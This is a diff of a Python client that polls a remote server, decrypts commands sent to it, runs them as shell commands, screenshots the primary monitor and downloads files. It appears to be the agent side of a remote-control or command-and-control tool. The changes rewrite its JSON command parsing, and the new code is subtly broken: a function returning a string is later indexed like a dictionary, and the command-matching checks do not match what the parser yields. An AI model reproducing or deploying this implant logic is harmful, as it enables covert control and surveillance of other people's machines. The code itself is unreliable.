@@ -313,6 +313,47 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return f"Error: {e.output}"
 
+def process_json_command(decrypted_text_ready_to_convert_to_json):
+                try:
+                    # Detect and fix nested JSON structure if needed
+                    if isinstance(decrypted_text_ready_to_convert_to_json, str):
+                        # Try parsing directly
+                        try:
+                            parsed_data = json.loads(decrypted_text_ready_to_convert_to_json)
+                        except json.JSONDecodeError:
+                            # If parsing fails, attempt to clean and fix malformed structure
+                            fixed_data = decrypted_text_ready_to_convert_to_json.replace('"{', '{').replace('}"', '}')
+                            parsed_data = json.loads(fixed_data)
+
+                    else:
+                        parsed_data = decrypted_text_ready_to_convert_to_json
+
+                    # Handle both nested and simple structures
+                    if isinstance(parsed_data, dict):
+                        for key, value in parsed_data.items():
+                            if isinstance(value, str):
+                                try:
+                                    # Try parsing inner JSON
+                                    inner_data = json.loads(value)
+                                    # Handle nested JSON with specific fields
+                                    if all(field in inner_data for field in ["upload_type", "client_id", "filename"]):
+                                        print(f"Upload Type: {inner_data['upload_type']}")
+                                        print(f"Client ID: {inner_data['client_id']}")
+                                        print(f"Filename: {inner_data['filename']}")
+                                    else:
+                                        # Handle other key-value structures
+                                        print(f"Key: {key}")
+                                        print(f"Value: {value}")
+                                except json.JSONDecodeError:
+                                    # Handle simple key-value pairs
+                                    return value
+                            else:
+                                return value
+                    else:
+                        print("Unexpected JSON structure")
+
+                except Exception as e:
+                    print("An error occurred:", e)
 
 while True:
     try:
@@ -323,10 +364,8 @@ while True:
         if response.status_code == 200:
             # Decode the Base64 response text
             decoded_data = base64.b64decode(response.text).decode('utf-8')
-
             # Convert the decoded string back to a dictionary
             data = json.loads(decoded_data)
-
             # Extract the nonce, ciphertext, and tag
             nonce_hex = data["nonce"]
             ciphertext_hex = data["ciphertext"]
@@ -334,9 +373,11 @@ while True:
 
             # Call decrypt_data function with aes_key and the extracted values
             decrypted_text = decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex).decode("utf-8")
-            command_in_json = (json.loads(decrypted_text.replace("'", '"')))
-            command = command_in_json.get("command")
-            print(command)  # for logging, remove later
+            decrypted_text_ready_to_convert_to_json = decrypted_text.replace("'", '"')
+
+            command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
+            command = f"{command_after_json_processing}"
+            
             if command == "screenshot":
                 with mss.mss() as sct:
                     screenshot = sct.grab(sct.monitors[1])  # Capture the primary monitor
@@ -352,12 +393,14 @@ while True:
                 pass
 
             
-            elif command.startswith('{"command": "UploadFromFiles"'):
-                # if all(key in command_data for key in ["command", "client_id", "filename"]) and command_data["command"] == "UploadFromFiles":
-                command_data = json.loads(command)
-                client_id = command_data["client_id"]
-                filename = command_data["filename"]
+            elif command.startswith("{'upload_type': 'UploadFromFiles'"):
+                print(command_after_json_processing)
+                client_id = command_after_json_processing["client_id"]
+                filename = command_after_json_processing["filename"]
+                print(client_id)
+                print(filename)
                 command=""
+                command_after_json_processing=""
                 # Send request to server
                 response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify='cert.pem')
 
@@ -374,11 +417,15 @@ while True:
                     print(f"Failed to download file. Server responded with status code {response.status_code}")
 
 
-            elif command.startswith('{"command": "UploadFromServer"'):
-                command_data = json.loads(command)
+            elif command.startswith("{'command': 'UploadFromServer'"):
+                print(command_after_json_processing)
+                client_id = command_after_json_processing["client_id"]
+                server_file_path_for_client = command_after_json_processing["server_file_path"]
+                print(client_id)
+                print(server_file_path_for_client)
                 command=""
-                client_id = command_data["client_id"]
-                server_file_path_for_client = command_data["server_file_path"]
+                command_after_json_processing=""
+                
                 response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify='cert.pem')
                 # Check if the response is successful
                 if response.status_code == 200:
@@ -392,13 +439,6 @@ while True:
                     print(f"File '{filename}' saved successfully in {current_directory}")
                 else:
                     print(f"Failed to download file. Server responded with status code {response.status_code}")
-
-
-
-
-
-
-
 
 
                 
